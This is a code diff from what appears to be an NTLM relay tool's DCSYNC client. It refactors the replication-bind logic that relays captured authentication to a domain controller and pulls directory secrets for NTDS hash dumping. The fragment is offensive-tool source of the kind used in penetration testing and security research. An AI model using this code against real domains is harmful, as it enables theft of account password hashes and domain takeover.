@@ -205,25 +205,6 @@ class DCSYNCRelayClient(ProtocolClient):
             authenticateMessage['MIC'] = newmic
             self.session.sendBindType3(authenticateMessage.getData())
 
-            # Now perform DRS bind
-            # This code comes from secretsdump directly
-            request = drsuapi.DRSBind()
-            request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
-            drs = drsuapi.DRS_EXTENSIONS_INT()
-            drs['cb'] = len(drs) #- 4
-            drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | \
-                             drsuapi.DRS_EXT_STRONG_ENCRYPTION
-            drs['SiteObjGuid'] = drsuapi.NULLGUID
-            drs['Pid'] = 0
-            drs['dwReplEpoch'] = 0
-            drs['dwFlagsExt'] = 0
-            drs['ConfigObjGUID'] = drsuapi.NULLGUID
-            # I'm uber potential (c) Ben
-            drs['dwExtCaps'] = 0xffffffff
-            request['pextClient']['cb'] = len(drs)
-            request['pextClient']['rgb'] = list(drs.getData())
-            resp = self.session.request(request)
-
             # Initialize remoteoperations
             if self.serverConfig.smbuser != '':
                 smbConnection = SMBConnection(self.target.netloc, self.target.netloc)
@@ -233,37 +214,16 @@ class DCSYNCRelayClient(ProtocolClient):
             else:
                 remoteOps = PatchedRemoteOperations(None, False)
 
-            # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
-            drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()
-
-            # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
-            ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
-            len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
-            drsExtensionsInt.fromString(ppextServer)
-
-            if drsExtensionsInt['dwReplEpoch'] != 0:
-                # Different epoch, we have to call DRSBind again
-                LOG.debug("DC's dwReplEpoch != 0, setting it to %d and calling DRSBind again" % drsExtensionsInt[
-                        'dwReplEpoch'])
-                drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
-                request['pextClient']['cb'] = len(drs)
-                request['pextClient']['rgb'] = list(drs.getData())
-                resp = self.session.request(request)
-
-            remoteOps._RemoteOperations__hDrs = resp['phDrs']
-
             domainName = authenticateMessage['domain_name'].decode('utf-16le')
-            # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
-            resp = drsuapi.hDRSDomainControllerInfo(self.session, remoteOps._RemoteOperations__hDrs, domainName, 2)
-            # LOG.debug('DRSDomainControllerInfo() answer')
-            # resp.dump()
-
-            if resp['pmsgOut']['V2']['cItems'] > 0:
-                remoteOps._RemoteOperations__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
-            else:
-                LOG.error("Couldn't get DC info for domain %s" % domainName)
-                raise Exception('Fatal, aborting')
-            remoteOps._RemoteOperations__drsr = self.session
+            extensions = (
+                drsuapi.DRS_EXT_GETCHGREQ_V6 |
+                drsuapi.DRS_EXT_GETCHGREPLY_V6 |
+                drsuapi.DRS_EXT_GETCHGREQ_V8 |
+                drsuapi.DRS_EXT_STRONG_ENCRYPTION
+            )
+            remoteOps.setDrsClient(
+                drsuapi.DRSUAPIClient(self.session, domainName, extensions=extensions)
+            )
 
             # Initialize NTDSHashes object
             if self.serverConfig.smbuser != '':
